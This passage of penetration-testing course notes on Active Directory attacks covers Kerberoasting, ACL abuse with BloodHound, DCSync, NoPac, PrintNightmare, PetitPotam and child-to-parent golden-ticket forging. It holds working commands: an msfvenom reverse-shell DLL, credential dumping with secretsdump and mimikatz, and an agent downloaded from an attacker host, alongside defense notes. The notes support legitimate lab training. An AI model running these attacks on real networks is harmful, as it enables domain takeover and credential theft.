| `$krb5tgs$23$` | RC4-HMAC | `13100` | Fast to crack |
| `$krb5tgs$17$` | AES128-CTS-HMAC-SHA1-96 | `19700` | Much slower to crack |
| `$krb5tgs$18$` | AES256-CTS-HMAC-SHA1-96 | `19800` | Much slower to crack |

If a target account only supports AES, expect cracking to take dramatically longer than an RC4 (etype 23) ticket for the same wordlist.

> **Related technique:** if an account has **"Do not require Kerberos preauthentication"** enabled, you don't even need valid credentials to request a crackable hash for it — this is **AS-REP Roasting**, a close cousin of Kerberoasting (not covered in depth in this lesson, but worth knowing the name and enumerating for: `Get-DomainUser -PreauthNotRequired`).

---

## 8. ACLs (Access Control Lists)

This is one of the most important sections in AD assessments — ACL misconfigurations are everywhere, and abusing them is core "lateral movement inside AD" tradecraft.

An ACL is made up of **Access Control Entries (ACEs)** — each entry grants or denies a specific right that one security principal (user, group, computer) holds over another AD object.

Two ACL types:

```
DACL (Discretionary Access Control List)  — defines who is allowed/denied access to an object
SACL (System Access Control List)         — logs who attempted access, success or failure
```

Three ACE types:

```
Access denied ACE
Access allowed ACE
System audit ACE
```

### 8.1 Enumerating ACLs with BloodHound

ACLs can be enumerated with **PowerView** or **BloodHound** — BloodHound is faster, clearer, and visualizes chained paths automatically, so it's the recommended approach.

**Example scenario setup** (pivoting into the internal network with RDP + Ligolo-ng, then collecting and reviewing in BloodHound):

```bash
xfreerdp3 /v:10.129.110.46 /u:htb-student /p:'Academy_student_AD!'
```

```bash
python3 -m http.server
sudo ./proxy -selfcert
```

```powershell
wget http://10.10.14.249:8000/agent.exe -o agent.exe
.\agent.exe -connect 10.10.14.249:11601 -ignore-cert
```

```bash
# Ligolo console
session
autoroute
```

```bash
ping 172.16.5.5
echo "172.16.5.5 INLANEFREIGHT.LOCAL" | sudo tee -a /etc/hosts

bloodhound-python -u 'wley' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all --zip

sudo neo4j start
unzip BloodHound-linux-x64.zip && cd BloodHound-linux-x64
./BloodHound --no-sandbox
```

Search for the compromised user, open **Node Info**, and expand **Outbound Object Control → Transitive Object Control**. This is where chained abuse paths show up, for example:

```
Me --[ForceChangePassword]--> UserA
UserA --[GenericWrite]--> GroupB
GroupB --[MemberOf-eligible via AddSelf]--> GroupC
GroupC --[GenericAll]--> UserD (target)
```

Right-click any edge in the graph → **Help** → the panel shows both the **Linux Abuse** and **Windows Abuse** commands for that specific right, pre-filled with placeholders you swap for your actual domain/DC/usernames.

> **Terminology clarification:** in a principal string like `DAMUNDSEN@INLANEFREIGHT.LOCAL`, `INLANEFREIGHT.LOCAL` is the **domain**, and `DAMUNDSEN` is the **account name** (user or, with a trailing `$`, a computer/service account) — not "the Domain Controller." (See the correction note in [6.3](#63-bloodhoundpy-and-pivoting-setup).)

If an "abuse" command from BloodHound's Help panel doesn't return the expected result, check what you actually obtained: a hash → crack it; a plaintext password → verify it works first:

```bash
nxc smb 172.16.5.5 -u <USER> -p <PASSWORD>
```

### 8.2 Common Abusable Rights

| Right | Abused with |
|---|---|
| `ForceChangePassword` | `Set-DomainUserPassword` |
| `Add Members` | `Add-DomainGroupMember` |
| `GenericAll` | `Set-DomainUserPassword` or `Add-DomainGroupMember` (grants full control — reset a password, add yourself to a group, etc.) |
| `GenericWrite` | `Set-DomainObject` |
| `WriteOwner` | `Set-DomainObjectOwner` |
| `WriteDACL` | `Add-DomainObjectACL` |
| `AllExtendedRights` | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| `AddSelf` | `Add-DomainGroupMember` (add your own account to a group) |
| `ReadLAPSPassword` | Read the LAPS-managed local Administrator password directly ([6.1](#61-security-controls)) |

Not every possible ACL abuse is covered in the source module — but once you understand the enumeration → identification → abuse workflow above, the same process applies to any right you encounter.

Sometimes the Linux Abuse hint from BloodHound points to a helper tool rather than a built-in command, e.g.:

```bash
targetedKerberoast.py -v -d 'domain.local' -u 'controlled_user' -p 'ItsPassword'
```

In that case, treat it as a pointer — go find, install, and read the tool's own documentation.

### 8.3 DCSync Attack

**DCSync** abuses AD's built-in domain-replication rights to ask a Domain Controller to "replicate" (i.e., hand over) password data for any account — including `krbtgt` and Domain Admins — without ever touching `NTDS.dit` directly or running code on the DC.

**Step 1 — find who has DCSync rights:**

In BloodHound: **Analysis → Find Principals with DCSync Rights**.

**Step 2 — run it:**

BloodHound's Linux/Windows Abuse panel for a DCSync-capable principal typically points to Impacket's `secretsdump.py`:

```bash
secretsdump.py 'inlanefreight.local'/'Administrator':'Password'@'172.16.5.5'
```

```bash
impacket-secretsdump inlanefreight.local/Administrator:Password@172.16.5.5
```

Output includes **every account's NTLM hash** in the domain. From here you can go straight to **Pass-the-Hash** (no cracking needed) exactly as covered in the Password Attacks module.

> **Defense note:** DCSync only requires the `Replicating Directory Changes` and `Replicating Directory Changes All` extended rights — legitimately needed only by Domain Controllers themselves and a small number of service accounts (e.g., Azure AD Connect). Any other principal holding these rights is a serious finding; monitor Event ID 4662 for replication requests from non-DC sources.

---

## 9. Stacking the Deck

### 9.1 Privileged Access (RDP, WinRM, MSSQL)

Once you control an account, check what it can actually *do*, not just what group memberships it has:

- Can it **RDP** into any machine?
- Can it use **PowerShell Remoting / WinRM** (`evil-winrm`)?
- Can it reach an **MSSQL** instance?
- Is it **local administrator** on any machine?

If none of the above apply, you'll need to keep moving laterally through other means (further ACL abuse, Kerberoasting other accounts, etc.).

**Via BloodHound** (recommended over PowerView for this — faster and clearer): open **Node Info** for your compromised user and check the **Execution Rights** panel, or use **Outbound Object Control** to see every user/group/computer you influence, then check each one's Execution Rights.

**Example — find everyone with PowerShell Remoting rights, via a custom Cypher query** (Analysis → Custom Queries):

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2
```

Running this might reveal, e.g., that `BIOVIS@INLANEFREIGHT.LOCAL` can PSRemote into `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`. (More ready-made Cypher queries: [xenoscr/Useful-BloodHound-Queries](https://github.com/xenoscr/Useful-BloodHound-Queries).) Save any query you like via the name field above the query box — it's stored under **Custom Queries** for reuse.

Once you've identified a reachable machine, connect with `evil-winrm` or `psexec.py`.

**Users with MSSQL access:** same search pattern in BloodHound — the edge between the user and the SQL server node also shows the port. Connect with Impacket's `mssqlclient.py`:

```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

From there, common MSSQL privilege-escalation primitives include `xp_cmdshell` (if enabled, gives OS command execution as the SQL service account) and impersonation (`EXECUTE AS LOGIN`) — see the dedicated MSSQL Privilege Escalation module for the full technique set.

**Users with RDP access:** same discovery process again, then connect normally over RDP.

### 9.2 The Kerberos Double Hop Problem

AD authentication is ticket-based, and a Kerberos ticket is generally valid for accessing **one** resource:

```
Attacker → evil-winrm → SRV01 → attempt to reach DC01  ✗ (fails)
```

Once you're on `SRV01` via `evil-winrm`, trying to reach `DC01` *from* `SRV01` using your current session fails — the ticket that authenticated you to `SRV01` isn't automatically forwarded to let `SRV01` authenticate onward to `DC01` on your behalf. This specifically bites WinRM sessions because WinRM logons don't delegate credentials by default.

**Workarounds:**

1. **Use RDP or PsExec instead of WinRM** — both cache your credentials in memory (via an interactive/network logon with delegation), so the "second hop" works naturally.
2. **Explicitly re-supply credentials inside the WinRM session:**

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

3. **Enable CredSSP delegation** (`Enable-WSManCredSSP`) on both ends if you control them, so credentials are forwarded automatically — heavier-handed and not always available on an assessment, but worth knowing exists.

### 9.3 Bleeding Edge Vulnerabilities

Known CVEs in AD-adjacent services. These sound "advanced" but are generally point-and-click with the right tooling.

#### NoPac

[CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) (SAM account name spoofing bypass) + [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) (a Kerberos PAC validation flaw) chained together let a low-privileged domain user impersonate a Domain Controller and obtain full domain compromise.

```bash
git clone https://github.com/Ridter/noPac.git
```

**Scan:**

```bash
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```

```
[*] Current ms-DS-MachineAccountQuota = 10        <- vulnerable as long as this isn't 0
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

`MachineAccountQuota > 0` means any authenticated user can create computer accounts — a prerequisite for this attack.

**Exploit — get a shell:**

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```

```bash
whoami
hostname
```

**Or dump every credential in the domain in one shot:**

```bash
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

#### PrintNightmare

Abuses the Print Spooler service (tracked as [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) / [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)) to load an attacker-supplied driver DLL, resulting in `SYSTEM`-level code execution — and on a DC, that means full domain compromise.

**1. Check if the target is potentially vulnerable** (Print Spooler RPC interfaces reachable):

```bash
rpcdump.py @172.16.5.5 | egrep "MS-RPRN|MS-PAR"
```

```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
```

**2. Generate a malicious DLL payload:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > fake.dll
```

**3. Host it over SMB.** `smbserver.py` shares a **directory**, not a single file — put the DLL inside a folder and share that folder:

```bash
mkdir CompData && mv fake.dll CompData/
sudo smbserver.py -smb2support CompData ./CompData
```

**4. Start a Metasploit handler** in another tab:

```
msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 172.16.5.225
set lport 8080
run
```

**5. Trigger the exploit** from a third tab:

```bash
cd /opt/CVE-2021-1675
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\fake.dll'
```

**6. Catch the callback** in the `multi/handler` tab, then:

```
shell
whoami
hostname
```

#### PetitPotam

The most dangerous of the three — and it needs **no credentials at all**.

**The idea:** normally, *you* authenticate to the Domain Controller. PetitPotam flips that around: it abuses **MS-EFSR (Encrypting File System Remote Protocol)** to trick the DC itself into authenticating to *you*. Specifically, it coerces the DC into looking up a file over EFSRPC, and that lookup process performs **NTLM authentication** back to the attacker — which the attacker relays.

The relay target is **AD Certificate Services' web enrollment endpoint**, requesting a certificate **in the Domain Controller's own name**. With that certificate you can request a Kerberos TGT (via PKINIT) as the DC's machine account, and from there run a **DCSync** to dump every credential in the domain.

**Step 1 — start the NTLM relay, pointed at the CA's web enrollment page:**

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_SERVER_NAME>/certsrv/certfnsh.asp --adcs --template DomainController
```

(Find the CA server's name via BloodHound if you don't already have it — search for CA-related nodes.)

**Step 2 — trigger the DC to authenticate to you, via PetitPotam:**

```bash
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
```

Watch the `ntlmrelayx.py` output — it will show the DC's machine account name (e.g., `ACADEMY-EA-DC01$`) and, on success, a **Base64-encoded certificate**. Save both, then stop the relay (`Ctrl+C`).

**Step 3 — request a TGT using the certificate (PKINIT):**

```bash
python3 /opt/PKINITtools/gettgtpkinit.py 'INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$' -pfx-base64 <BASE64_CERT> dc01.cache
```

Wait for `Saved TGT to file`, then load it into your environment:

```bash
export KRB5CCNAME=dc01.cache
klist
```

**Step 4 — DCSync using the DC's own machine ticket:**

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01\$@INLANEFREIGHT.LOCAL"
# fallback if the above doesn't resolve correctly:
secretsdump.py -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

**Step 5 — use the recovered Administrator hash:**

```bash
evil-winrm -u administrator -H <HASH> -i 172.16.5.5
```

(A Windows-native version of this attack chain exists too — see the HTB Academy module, "PetitPotam" section, for the walkthrough.)

> **Defense note:** this attack is a well-known variant of the "ESC8" AD CS relay class of issues. Patching includes disabling NTLM on Domain Controllers where feasible, enabling **Extended Protection for Authentication (EPA)** and requiring HTTPS on AD CS web enrollment endpoints, and disabling the vulnerable EFSRPC pipe via the official Microsoft mitigation.

---

## 10. Domain and Forest Trusts

A **trust** lets two (or more) domains communicate and interact — a misconfigured trust is often a huge attack path in its own right.

### 10.1 Types of Trusts

- **Parent → Child Trust** — a child domain (e.g. `DEV.OMER.LOCAL`) automatically trusts its parent (`OMER.LOCAL`), and vice versa.
- **Cross-Link Trust** — a direct trust between two child domains (e.g. `ADMIN.DEV.INLANEFREIGHT.LOCAL` ↔ `WH.CORP.INLANEFREIGHT.LOCAL`), typically created to speed up authentication that would otherwise have to walk up and back down the domain tree.
- **External Trust** — a trust between one domain in one forest and one domain in a *different* forest. **Non-transitive**: only the two named domains trust each other; no other domain in either forest is included.

  ```
       Forest 1                                Forest 2
  |-----------------|                    |-----------------|
  |                 |                    |                 |
  |  |-----------|  |   External Trust   |   |-----------| |
  |  |  Domain 1 |-------------------------->| Domain 2  | |
  |  |___________|  |                    |   |___________| |
  |                 |                    |                 |
  |-----------------|                    |-----------------|
  ```

- **Tree-Root Trust** — connects separate domain trees within the *same* forest (a forest can contain more than one tree of parent/child domains).
- **Forest Trust** — like an External Trust, but between two entire forests, and **transitive**: every domain inside Forest 1 trusts every domain inside Forest 2, not just two named domains.
- **Transitive Trust** — extends automatically: if Forest 1 trusts Forest 2, every machine/domain in Forest 1 trusts every machine/domain in Forest 2.
- **Non-Transitive Trust** — limited strictly to the two domains directly involved.

### 10.2 Enumerating Trusts

**From Windows — AD module:**

```powershell
Import-Module ActiveDirectory
Get-ADTrust -Filter *
```

```
Direction : BiDirectional
DisallowTransivity : False
DistinguishedName : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
Name : LOGISTICS.INLANEFREIGHT.LOCAL
...
```

(This example shows a Parent/Child trust between `INLANEFREIGHT.LOCAL` and `LOGISTICS.INLANEFREIGHT.LOCAL`.)

**From Windows — PowerView:**

```powershell
Import-Module .\PowerView.ps1
Get-DomainTrust
Get-DomainTrustMapping     # more detail
```

**From BloodHound:** search for the root domain node, then **Analysis → Map Domain Trusts**.

### 10.3 Attacking Child to Parent Trusts

#### From Windows

Confirm you're actually in the child domain:

```powershell
Get-Domain
```

Enumerate the parent domain's users (works because of the automatic bidirectional child↔parent trust):

```powershell
Get-DomainUser -Domain <PARENT_DOMAIN_NAME> | Select-Object samaccountname
```

**The attack — SID History / Golden Ticket with an Extra SID.** This works because **SID Filtering** is often not enforced within a forest across the parent/child boundary. When you inject the **Enterprise Admins** SID as an *extra SID* into a forged Golden Ticket, that ticket grants Enterprise Admin — i.e., **full control over the parent domain**.

To forge a Golden Ticket you need:

1. The **child domain's SID**
2. A username to impersonate (can be entirely made up)
3. The child domain's **full name (FQDN)**
4. The **Enterprise Admins group SID**
5. The **`krbtgt` account's NT hash** for the child domain (requires full compromise of the child domain already — this is the Kerberos signing key that makes ticket forgery possible)

**Step 1 — get the krbtgt hash (Mimikatz):**

```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

```
Hash NTLM : 94sf4nu0498nwecs094dsj8
```

**Step 2 — get the child domain's SID (PowerView):**

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

```
S-1-5-21-206153819-209893948-922872689
```

**Step 3 — get the Enterprise Admins SID (from the parent domain):**

```powershell
Get-DomainGroup -Domain <PARENT_DOMAIN_NAME> -Identity "Enterprise Admins" | Select-Object distinguishedname,objectsid
```

```
S-1-5-21-3842939050-3880317879-2865463114-519
```

**Step 4 — pick any username** (fake is fine — this is a fully forged ticket, not a real logon):

```
CPTS
```

**Step 5 — confirm the full child domain FQDN:**

```powershell
Get-Domain
```

```
LOGISTICS.INLANEFREIGHT.LOCAL
```

**Step 6 — forge and inject the ticket (Mimikatz):**

```
mimikatz # kerberos::golden /user:CPTS /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-206153819-209893948-922872689 /krbtgt:94sf4nu0498nwecs094dsj8 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

`/ptt` injects the forged ticket straight into memory. Verify:

```
klist
```

**Step 7 — access the parent domain:**

```powershell
ls \\<PARENT_DOMAIN_FULL_NAME>\C$
```

Without the forged ticket this fails with an access-denied error — with it, you now have access to resources across the entire parent domain (and, by extension, potentially the whole forest).

#### From Linux

Same technique, different tooling.

**Get the krbtgt hash:**

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

**Get the child domain SID:**

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

**Get the Enterprise Admins SID** (same tool, pointed at the parent DC's IP):

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5
```

**Forge the ticket with `ticketer.py`:**

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 CPTS
```

```
[*] Saving ticket in CPTS.ccache
```

Load it:

```bash
export KRB5CCNAME=CPTS.ccache
```

**Use it — e.g., get a SYSTEM shell on the parent DC:**

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/CPTS@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

**Fully automated version of this entire chain:**

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

`raiseChild.py` runs every step above automatically and drops you into a shell — but understanding the manual process (above) matters far more than knowing this one command, both for the exam and for explaining the finding in a report.

> **Modern hardening note:** post-[KB5008380](https://support.microsoft.com/kb/5008380) (November 2021), Microsoft tightened default handling around cross-domain authentication and SID history validation. This attack still works in plenty of real environments (and in the lab), but don't assume it will succeed unmodified against a fully patched, tightly-configured forest — enumerate SID Filtering status before relying on it.

### 10.4 Attacking Cross-Forest Trusts

Conceptually the same "abuse the trust relationship" idea, but between two **separate forests** (call them Domain A and Domain B) connected by a trust, rather than a parent/child pair. Useful when the "easy" target domain is hardened, but it trusts a domain that isn't.

**From Windows:**

```powershell
Import-Module .\PowerView.ps1

Get-Domain              # confirm you're in Domain A
Get-DomainTrust          # shows Domain A trusts Domain B
```

Find Kerberoastable accounts in Domain A that are members of a privileged group **in Domain B**:

```powershell
Get-DomainUser -SPN -Domain A | Select-Object SamAccountName
```

```
samaccountname
--------------
krbtgt
mssqlsvc
```

Inspect each candidate fully to find one worth targeting:

```powershell
Get-DomainUser -SPN -Domain A
```

Look for something like:

```
memberof : CN=Domain Admins,CN=Users,DC=B,DC=LOCAL
```

— an account in Domain A that's a Domain Admin **in Domain B**. That's the target.

**Kerberoast it:**

```powershell
.\Rubeus.exe kerberoast /domain:A /user:mssqlsvc /nowrap
```

```
HASH : <HASH>
```

Save it and crack offline:

```bash
hashcat -a 0 -m 13100 HASH1.txt /usr/share/wordlists/rockyou.txt
```

A successful crack here hands you a **Domain Admin password in a completely different forest** — reached entirely through the trust relationship, without ever directly attacking Domain B.

---

*End of module notes.*
